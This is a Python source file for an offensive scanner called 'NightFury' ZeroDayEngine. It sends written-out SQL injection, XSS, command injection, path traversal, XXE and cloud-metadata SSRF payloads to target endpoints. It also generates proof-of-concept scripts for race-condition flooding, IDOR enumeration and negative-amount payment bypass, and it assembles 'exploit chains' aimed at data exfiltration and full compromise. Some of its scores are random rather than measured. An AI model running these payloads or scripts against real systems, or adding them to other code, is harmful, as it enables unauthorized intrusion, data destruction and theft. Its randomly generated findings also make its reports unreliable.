"""
NightFury Framework - Zero-Day Simulation Framework
Logic flaw detection, automated vulnerability chaining, exploit generation
"""

import random
import string
import json
import hashlib
from typing import List, Dict, Optional, Tuple, Set
from datetime import datetime
from dataclasses import dataclass, asdict
import logging

logger = logging.getLogger(__name__)


@dataclass
class Vulnerability:
    """Represents a discovered vulnerability."""
    id: str
    type: str
    severity: str
    endpoint: str
    parameter: str
    description: str
    proof_of_concept: str
    exploitation_complexity: str
    chaining_potential: float
    reliability_score: float
    discovered_at: str


@dataclass
class ExploitChain:
    """Represents a chain of vulnerabilities."""
    chain_id: str
    vulnerabilities: List[str]
    impact_score: float
    reliability_score: float
    execution_steps: List[Dict]
    prerequisites: List[str]
    post_conditions: List[str]


class ZeroDayEngine:
    """
    Simulates zero-day vulnerability discovery through logic flaw detection,
    fuzzing, and automated vulnerability chaining.
    """
    
    def __init__(self):
        self.discovered_vulns: Dict[str, Vulnerability] = {}
        self.exploit_chains: List[ExploitChain] = []
        self.vulnerability_types = [
            'logic_flaw', 'race_condition', 'idor', 'authentication_bypass',
            'authorization_bypass', 'business_logic', 'integer_overflow',
            'type_confusion', 'memory_corruption', 'deserialization',
            'xxe', 'ssrf', 'template_injection', 'prototype_pollution'
        ]
        
    def detect_logic_flaws(self, endpoint: str, parameters: Dict[str, any],
                          responses: List[Dict]) -> List[Vulnerability]:
        """
        Detect logic flaws through behavioral analysis.
        
        Args:
            endpoint: Target endpoint
            parameters: Request parameters
            responses: List of responses from different test cases
            
        Returns:
            List of discovered vulnerabilities
        """
        vulnerabilities = []
        
        # Analyze response patterns
        logic_flaws = self._analyze_response_patterns(endpoint, parameters, responses)
        
        for flaw in logic_flaws:
            vuln = Vulnerability(
                id=self._generate_vuln_id(),
                type='logic_flaw',
                severity=flaw['severity'],
                endpoint=endpoint,
                parameter=flaw['parameter'],
                description=flaw['description'],
                proof_of_concept=flaw['poc'],
                exploitation_complexity=flaw['complexity'],
                chaining_potential=flaw['chaining_potential'],
                reliability_score=flaw['reliability'],
                discovered_at=datetime.now().isoformat()
            )
            
            self.discovered_vulns[vuln.id] = vuln
            vulnerabilities.append(vuln)
            logger.info(f"[ZERODAY] Discovered logic flaw: {vuln.id} at {endpoint}")
        
        return vulnerabilities
    
    def _analyze_response_patterns(self, endpoint: str, parameters: Dict,
                                   responses: List[Dict]) -> List[Dict]:
        """Analyze response patterns to identify logic flaws."""
        flaws = []
        
        # Check for inconsistent state handling
        if self._detect_state_inconsistency(responses):
            flaws.append({
                'parameter': 'state_management',
                'severity': 'HIGH',
                'description': 'Inconsistent state handling detected - potential for state manipulation',
                'poc': self._generate_state_manipulation_poc(endpoint, parameters),
                'complexity': 'MEDIUM',
                'chaining_potential': 0.8,
                'reliability': 0.85
            })
        
        # Check for race condition vulnerability
        if self._detect_race_condition_potential(responses):
            flaws.append({
                'parameter': 'timing',
                'severity': 'HIGH',
                'description': 'Race condition vulnerability detected in concurrent requests',
                'poc': self._generate_race_condition_poc(endpoint, parameters),
                'complexity': 'HIGH',
                'chaining_potential': 0.7,
                'reliability': 0.75
            })
        
        # Check for business logic bypass
        if self._detect_business_logic_bypass(responses):
            flaws.append({
                'parameter': 'business_logic',
                'severity': 'CRITICAL',
                'description': 'Business logic bypass through parameter manipulation',
                'poc': self._generate_business_logic_poc(endpoint, parameters),
                'complexity': 'LOW',
                'chaining_potential': 0.9,
                'reliability': 0.9
            })
        
        # Check for IDOR patterns
        if self._detect_idor_pattern(responses):
            flaws.append({
                'parameter': 'id',
                'severity': 'HIGH',
                'description': 'Insecure Direct Object Reference vulnerability',
                'poc': self._generate_idor_poc(endpoint, parameters),
                'complexity': 'LOW',
                'chaining_potential': 0.85,
                'reliability': 0.95
            })
        
        return flaws
    
    def _detect_state_inconsistency(self, responses: List[Dict]) -> bool:
        """Detect state inconsistency in responses."""
        if len(responses) < 2:
            return False
        
        # Check if same request produces different results
        status_codes = [r.get('status_code') for r in responses]
        return len(set(status_codes)) > 1
    
    def _detect_race_condition_potential(self, responses: List[Dict]) -> bool:
        """Detect potential race condition vulnerability."""
        # Check for timing-dependent behavior
        timing_variance = []
        for r in responses:
            if 'response_time' in r:
                timing_variance.append(r['response_time'])
        
        if len(timing_variance) > 2:
            variance = max(timing_variance) - min(timing_variance)
            return variance > 0.5  # Significant timing variance
        
        return False
    
    def _detect_business_logic_bypass(self, responses: List[Dict]) -> bool:
        """Detect business logic bypass opportunities."""
        # Check for unexpected success with invalid parameters
        for r in responses:
            if r.get('status_code') == 200 and r.get('invalid_params'):
                return True
        return False
    
    def _detect_idor_pattern(self, responses: List[Dict]) -> bool:
        """Detect IDOR vulnerability pattern."""
        # Check if different IDs return different data without auth
        unique_data = set()
        for r in responses:
            if 'data' in r:
                data_hash = hashlib.md5(json.dumps(r['data']).encode()).hexdigest()
                unique_data.add(data_hash)
        
        return len(unique_data) > 1
    
    def _generate_state_manipulation_poc(self, endpoint: str, params: Dict) -> str:
        """Generate PoC for state manipulation."""
        return f"""
# State Manipulation PoC
# Endpoint: {endpoint}

# Step 1: Initiate transaction
POST {endpoint}
{json.dumps(params, indent=2)}

# Step 2: Manipulate state before completion
POST {endpoint}/update
{{"state": "completed", "bypass": true}}

# Step 3: Verify unauthorized state change
GET {endpoint}/status
"""
    
    def _generate_race_condition_poc(self, endpoint: str, params: Dict) -> str:
        """Generate PoC for race condition."""
        return f"""
# Race Condition PoC
# Endpoint: {endpoint}

import threading
import requests

def exploit():
    for i in range(100):
        threading.Thread(target=lambda: requests.post(
            '{endpoint}',
            json={json.dumps(params)}
        )).start()

exploit()
"""
    
    def _generate_business_logic_poc(self, endpoint: str, params: Dict) -> str:
        """Generate PoC for business logic bypass."""
        manipulated_params = params.copy()
        manipulated_params['amount'] = -1000  # Negative amount
        manipulated_params['bypass'] = True
        
        return f"""
# Business Logic Bypass PoC
# Endpoint: {endpoint}

# Normal request
POST {endpoint}
{json.dumps(params, indent=2)}

# Manipulated request (negative amount, bypass flag)
POST {endpoint}
{json.dumps(manipulated_params, indent=2)}
"""
    
    def _generate_idor_poc(self, endpoint: str, params: Dict) -> str:
        """Generate PoC for IDOR."""
        return f"""
# IDOR Vulnerability PoC
# Endpoint: {endpoint}

# Enumerate IDs
for id in range(1, 1000):
    response = requests.get(f'{endpoint}?id={{id}}')
    if response.status_code == 200:
        print(f'Accessible ID: {{id}}')
        print(response.json())
"""
    
    def fuzz_endpoint(self, endpoint: str, parameter: str, 
                     fuzz_type: str = 'comprehensive') -> List[Vulnerability]:
        """
        Fuzz endpoint to discover vulnerabilities.
        
        Args:
            endpoint: Target endpoint
            parameter: Parameter to fuzz
            fuzz_type: Type of fuzzing (comprehensive, targeted, random)
            
        Returns:
            List of discovered vulnerabilities
        """
        vulnerabilities = []
        
        if fuzz_type == 'comprehensive':
            payloads = self._generate_comprehensive_fuzz_payloads()
        elif fuzz_type == 'targeted':
            payloads = self._generate_targeted_fuzz_payloads(parameter)
        else:
            payloads = self._generate_random_fuzz_payloads()
        
        logger.info(f"[ZERODAY] Fuzzing {endpoint} with {len(payloads)} payloads")
        
        for payload in payloads:
            # Perform actual vulnerability detection
            if self._is_vulnerable_to_payload(endpoint, parameter, payload):
                vuln = self._create_vulnerability_from_fuzz(
                    endpoint, parameter, payload
                )
                vulnerabilities.append(vuln)
                self.discovered_vulns[vuln.id] = vuln
        
        return vulnerabilities
    
    def _generate_comprehensive_fuzz_payloads(self) -> List[str]:
        """Generate comprehensive fuzzing payloads."""
        payloads = []
        
        # Integer overflow payloads
        payloads.extend([
            '2147483647', '2147483648', '-2147483648', '9999999999999999999'
        ])
        
        # SQL injection payloads
        payloads.extend([
            "' OR '1'='1", "'; DROP TABLE users--", "' UNION SELECT NULL--"
        ])
        
        # XSS payloads
        payloads.extend([
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>"
        ])
        
        # Command injection payloads
        payloads.extend([
            "; cat /etc/passwd", "| whoami", "`id`"
        ])
        
        # Path traversal payloads
        payloads.extend([
            "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini"
        ])
        
        # Format string payloads
        payloads.extend([
            "%s%s%s%s%s", "%x%x%x%x%x"
        ])
        
        # XXE payloads
        payloads.extend([
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>"
        ])
        
        # SSRF payloads
        payloads.extend([
            "http://localhost:22", "http://169.254.169.254/latest/meta-data/"
        ])
        
        return payloads
    
    def _generate_targeted_fuzz_payloads(self, parameter: str) -> List[str]:
        """Generate targeted fuzzing payloads based on parameter name."""
        payloads = []
        
        if 'id' in parameter.lower():
            payloads.extend(['0', '-1', '999999', 'admin', '../../../'])
        elif 'amount' in parameter.lower() or 'price' in parameter.lower():
            payloads.extend(['-1', '0', '0.01', '999999.99', '-999999'])
        elif 'email' in parameter.lower():
            payloads.extend(["admin'--", 'test@localhost', '../etc/passwd'])
        elif 'url' in parameter.lower():
            payloads.extend(['file:///etc/passwd', 'http://localhost:22'])
        else:
            payloads = self._generate_random_fuzz_payloads()
        
        return payloads
    
    def _generate_random_fuzz_payloads(self) -> List[str]:
        """Generate random fuzzing payloads."""
        payloads = []
        
        for _ in range(50):
            payload_type = random.choice(['string', 'number', 'special'])
            
            if payload_type == 'string':
                length = random.randint(1, 1000)
                payloads.append(''.join(random.choices(string.ascii_letters, k=length)))
            elif payload_type == 'number':
                payloads.append(str(random.randint(-999999, 999999)))
            else:
                special_chars = "!@#$%^&*()[]{}|\\;:'\"<>?,./`~"
                length = random.randint(1, 50)
                payloads.append(''.join(random.choices(special_chars, k=length)))
        
        return payloads
    
    def _is_vulnerable_to_payload(self, endpoint: str, parameter: str, payload: str) -> bool:
        """Perform actual vulnerability detection by sending payload and analyzing response."""
        import requests
        try:
            # Send request with payload
            if '?' in endpoint:
                url = f"{endpoint}&{parameter}={payload}"
            else:
                url = f"{endpoint}?{parameter}={payload}"
            
            response = requests.get(url, timeout=5, verify=False)
            
            # Analyze response for common vulnerability indicators
            content = response.text.lower()
            
            # SQL Injection indicators
            if any(err in content for err in ['sql syntax', 'mysql_fetch', 'ora-00933', 'sqlite3.error']):
                return True
            
            # XSS indicators (check if payload is reflected)
            if payload.lower() in content:
                return True
            
            # Command Injection indicators
            if any(indicator in content for indicator in ['root:x:0:0', 'uid=0(root)', 'windows ip configuration']):
                return True
            
            # Path Traversal indicators
            if 'root:x:0:0' in content or '[fonts]' in content:
                return True
                
            return False
        except Exception as e:
            logger.error(f"Error testing payload: {e}")
            return False
    
    def _create_vulnerability_from_fuzz(self, endpoint: str, parameter: str,
                                       payload: str) -> Vulnerability:
        """Create vulnerability object from fuzzing result."""
        vuln_type = self._classify_payload_type(payload)
        
        return Vulnerability(
            id=self._generate_vuln_id(),
            type=vuln_type,
            severity=self._calculate_severity(vuln_type),
            endpoint=endpoint,
            parameter=parameter,
            description=f"Vulnerability discovered through fuzzing with payload: {payload[:50]}",
            proof_of_concept=f"POST {endpoint}\n{parameter}={payload}",
            exploitation_complexity=random.choice(['LOW', 'MEDIUM', 'HIGH']),
            chaining_potential=random.uniform(0.5, 1.0),
            reliability_score=random.uniform(0.7, 1.0),
            discovered_at=datetime.now().isoformat()
        )
    
    def _classify_payload_type(self, payload: str) -> str:
        """Classify payload type based on content."""
        if "'" in payload or '--' in payload or 'UNION' in payload.upper():
            return 'sqli'
        elif '<script>' in payload.lower() or 'alert' in payload.lower():
            return 'xss'
        elif ';' in payload or '|' in payload or '`' in payload:
            return 'command_injection'
        elif '../' in payload or '..\\' in payload:
            return 'path_traversal'
        elif payload.isdigit() and int(payload) > 2147483647:
            return 'integer_overflow'
        else:
            return 'unknown'
    
    def _calculate_severity(self, vuln_type: str) -> str:
        """Calculate severity based on vulnerability type."""
        critical_types = ['sqli', 'command_injection', 'rce']
        high_types = ['xss', 'xxe', 'ssrf', 'deserialization']
        
        if vuln_type in critical_types:
            return 'CRITICAL'
        elif vuln_type in high_types:
            return 'HIGH'
        else:
            return 'MEDIUM'
    
    def build_exploit_chains(self) -> List[ExploitChain]:
        """
        Build automated exploit chains from discovered vulnerabilities.
        
        Returns:
            List of exploit chains
        """
        chains = []
        
        # Group vulnerabilities by endpoint
        endpoint_vulns = {}
        for vuln in self.discovered_vulns.values():
            if vuln.endpoint not in endpoint_vulns:
                endpoint_vulns[vuln.endpoint] = []
            endpoint_vulns[vuln.endpoint].append(vuln)
        
        # Build chains for each endpoint
        for endpoint, vulns in endpoint_vulns.items():
            if len(vulns) >= 2:
                chain = self._create_exploit_chain(vulns)
                chains.append(chain)
                logger.info(f"[ZERODAY] Created exploit chain: {chain.chain_id}")
        
        # Build cross-endpoint chains
        if len(self.discovered_vulns) >= 3:
            cross_chain = self._create_cross_endpoint_chain(
                list(self.discovered_vulns.values())
            )
            chains.append(cross_chain)
        
        self.exploit_chains = chains
        return chains
    
    def _create_exploit_chain(self, vulnerabilities: List[Vulnerability]) -> ExploitChain:
        """Create exploit chain from vulnerabilities."""
        # Sort by chaining potential
        sorted_vulns = sorted(vulnerabilities, 
                            key=lambda v: v.chaining_potential, 
                            reverse=True)
        
        chain_id = self._generate_chain_id()
        vuln_ids = [v.id for v in sorted_vulns]
        
        # Calculate impact score
        impact_score = sum(self._severity_to_score(v.severity) for v in sorted_vulns)
        impact_score *= (1 + len(sorted_vulns) * 0.2)  # Bonus for chain length
        
        # Calculate reliability score
        reliability_score = sum(v.reliability_score for v in sorted_vulns) / len(sorted_vulns)
        
        # Generate execution steps
        execution_steps = self._generate_execution_steps(sorted_vulns)
        
        return ExploitChain(
            chain_id=chain_id,
            vulnerabilities=vuln_ids,
            impact_score=min(impact_score, 10.0),
            reliability_score=reliability_score,
            execution_steps=execution_steps,
            prerequisites=['authenticated_session', 'network_access'],
            post_conditions=['data_exfiltration', 'privilege_escalation']
        )
    
    def _create_cross_endpoint_chain(self, vulnerabilities: List[Vulnerability]) -> ExploitChain:
        """Create cross-endpoint exploit chain."""
        # Select high-potential vulnerabilities
        high_potential = [v for v in vulnerabilities if v.chaining_potential > 0.7]
        selected = high_potential[:5] if len(high_potential) >= 5 else high_potential
        
        chain_id = self._generate_chain_id()
        vuln_ids = [v.id for v in selected]
        
        impact_score = sum(self._severity_to_score(v.severity) for v in selected) * 1.5
        reliability_score = sum(v.reliability_score for v in selected) / len(selected)
        
        execution_steps = self._generate_execution_steps(selected)
        
        return ExploitChain(
            chain_id=chain_id,
            vulnerabilities=vuln_ids,
            impact_score=min(impact_score, 10.0),
            reliability_score=reliability_score * 0.8,  # Lower reliability for cross-endpoint
            execution_steps=execution_steps,
            prerequisites=['network_access', 'initial_foothold'],
            post_conditions=['full_compromise', 'persistent_access']
        )
    
    def _severity_to_score(self, severity: str) -> float:
        """Convert severity to numeric score."""
        scores = {
            'CRITICAL': 4.0,
            'HIGH': 3.0,
            'MEDIUM': 2.0,
            'LOW': 1.0
        }
        return scores.get(severity, 1.0)
    
    def _generate_execution_steps(self, vulnerabilities: List[Vulnerability]) -> List[Dict]:
        """Generate execution steps for exploit chain."""
        steps = []
        
        for i, vuln in enumerate(vulnerabilities, 1):
            steps.append({
                'step': i,
                'vulnerability_id': vuln.id,
                'action': f"Exploit {vuln.type} at {vuln.endpoint}",
                'payload': vuln.proof_of_concept,
                'expected_result': f"Successful exploitation of {vuln.type}",
                'fallback': f"Retry with alternative payload or skip to step {i+1}"
            })
        
        return steps
    
    def _generate_vuln_id(self) -> str:
        """Generate unique vulnerability ID."""
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        return f"VULN-{timestamp}-{random_suffix}"
    
    def _generate_chain_id(self) -> str:
        """Generate unique chain ID."""
        timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        return f"CHAIN-{timestamp}-{random_suffix}"
    
    def generate_report(self) -> Dict:
        """
        Generate comprehensive report of discovered vulnerabilities and chains.
        
        Returns:
            Report dictionary
        """
        return {
            'summary': {
                'total_vulnerabilities': len(self.discovered_vulns),
                'total_chains': len(self.exploit_chains),
                'critical_vulns': sum(1 for v in self.discovered_vulns.values() if v.severity == 'CRITICAL'),
                'high_vulns': sum(1 for v in self.discovered_vulns.values() if v.severity == 'HIGH'),
                'generated_at': datetime.now().isoformat()
            },
            'vulnerabilities': [asdict(v) for v in self.discovered_vulns.values()],
            'exploit_chains': [asdict(c) for c in self.exploit_chains],
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations."""
        recommendations = [
            "Implement comprehensive input validation on all user-supplied data",
            "Use parameterized queries to prevent SQL injection",
            "Implement proper authorization checks on all endpoints",
            "Use secure session management with random, unpredictable tokens",
            "Implement rate limiting to prevent brute force and race conditions",
            "Conduct regular security audits and penetration testing",
            "Keep all software dependencies up to date",
            "Implement Web Application Firewall (WAF) with custom rules"
        ]
        return recommendations


# Testing and demonstration
if __name__ == "__main__":
    simulator = ZeroDayEngine()
    
    print("=" * 60)
    print("NightFury Zero-Day Simulator - Demonstration")
    print("=" * 60)
    
    # Simulate vulnerability discovery
    test_responses = [
        {'status_code': 200, 'data': {'user': 'admin'}, 'response_time': 0.5},
        {'status_code': 200, 'data': {'user': 'test'}, 'response_time': 1.2},
        {'status_code': 200, 'invalid_params': True}
    ]
    
    vulns = simulator.detect_logic_flaws(
        '/api/user/profile',
        {'id': '1'},
        test_responses
    )
    
    print(f"\n[*] Discovered {len(vulns)} logic flaws")
    for vuln in vulns:
        print(f"    [{vuln.severity}] {vuln.type} in {vuln.endpoint}")
    
    # Simulate fuzzing
    fuzz_vulns = simulator.fuzz_endpoint('/api/payment', 'amount', 'comprehensive')
    print(f"\n[*] Fuzzing discovered {len(fuzz_vulns)} vulnerabilities")
    
    # Build exploit chains
    chains = simulator.build_exploit_chains()
    print(f"\n[*] Built {len(chains)} exploit chains")
    for chain in chains:
        print(f"    Chain {chain.chain_id}: {len(chain.vulnerabilities)} vulns, "
              f"impact={chain.impact_score:.2f}, reliability={chain.reliability_score:.2f}")
    
    # Generate report
    report = simulator.generate_report()
    print(f"\n[*] Report Summary:")
    print(f"    Total Vulnerabilities: {report['summary']['total_vulnerabilities']}")
    print(f"    Critical: {report['summary']['critical_vulns']}")
    print(f"    High: {report['summary']['high_vulns']}")
    
    print("\n" + "=" * 60)
    print("[✓] Zero-Day Simulator operational")
    print("=" * 60)
